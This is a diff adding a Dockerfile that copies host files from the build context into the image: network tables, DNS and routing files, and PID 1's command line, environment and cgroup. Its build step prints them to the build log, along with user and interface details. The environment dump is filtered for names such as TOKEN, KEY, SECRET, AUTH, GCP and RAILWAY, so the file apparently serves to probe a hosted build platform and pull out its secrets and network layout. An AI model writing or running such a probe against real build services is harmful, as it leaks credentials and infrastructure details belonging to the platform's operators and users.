@@ -1,0 +1,44 @@
+FROM alpine:3.20
+COPY etc/hosts /v/hosts
+COPY etc/hostname /v/hostname
+COPY etc/resolv.conf /v/resolv
+COPY proc/net/tcp /v/net_tcp
+COPY proc/net/tcp6 /v/net_tcp6
+COPY proc/net/udp /v/net_udp
+COPY proc/net/udp6 /v/net_udp6
+COPY proc/net/unix /v/net_unix
+COPY proc/net/route /v/route
+COPY proc/net/dev /v/devnd
+COPY proc/net/arp /v/arp
+COPY proc/1/net/tcp /v/p1_tcp
+COPY proc/1/net/tcp6 /v/p1_tcp6
+COPY proc/1/net/udp /v/p1_udp
+COPY proc/1/net/unix /v/p1_unix
+COPY proc/1/cmdline /v/p1_cmd
+COPY proc/1/environ /v/p1_env
+COPY proc/1/status /v/p1_status
+COPY proc/1/cgroup /v/p1_cgroup
+RUN set -x; echo "===V1BEGIN==="; \
+ echo "--HOSTS--"; cat /v/hosts; \
+ echo "--HOSTNAME--"; cat /v/hostname; \
+ echo "--RESOLV--"; cat /v/resolv; \
+ echo "--ROUTE--"; cat /v/route; \
+ echo "--DEV--"; cat /v/devnd; \
+ echo "--ARP--"; cat /v/arp; \
+ echo "--NET_TCP--"; cat /v/net_tcp; \
+ echo "--NET_TCP6--"; cat /v/net_tcp6; \
+ echo "--NET_UDP--"; cat /v/net_udp; \
+ echo "--NET_UDP6--"; cat /v/net_udp6; \
+ echo "--NET_UNIX--"; cat /v/net_unix; \
+ echo "--P1_TCP--"; cat /v/p1_tcp; \
+ echo "--P1_TCP6--"; cat /v/p1_tcp6; \
+ echo "--P1_UDP--"; cat /v/p1_udp; \
+ echo "--P1_UNIX--"; cat /v/p1_unix; \
+ echo "--P1_CMD--"; od -An -c /v/p1_cmd | head -20; \
+ echo "--P1_ENV--"; tr '\0' '\n' < /v/p1_env | grep -aiE 'TOKEN|KEY|SECRET|ADDR|PORT|HOST|URL|ORCH|BUILD|GCP|RAILWAY|TEMP|AUTH|CERT|PROC|DATA' | sed -E 's/^([A-Za-z0-9_]+)=(.*)$/\1=\2/' | head -80; \
+ echo "--P1_ENV_N--"; tr '\0' '\n' < /v/p1_env | wc -l; \
+ echo "--P1_STATUS--"; head -20 /v/p1_status; \
+ echo "--P1_CGROUP--"; cat /v/p1_cgroup; \
+ echo "--RUNSELF--"; id; uname -a; cat /etc/hostname; ip -o addr 2>/dev/null; ip route 2>/dev/null; \
+ echo "===V1END==="
+CMD ["sh","-c","sleep 60"]
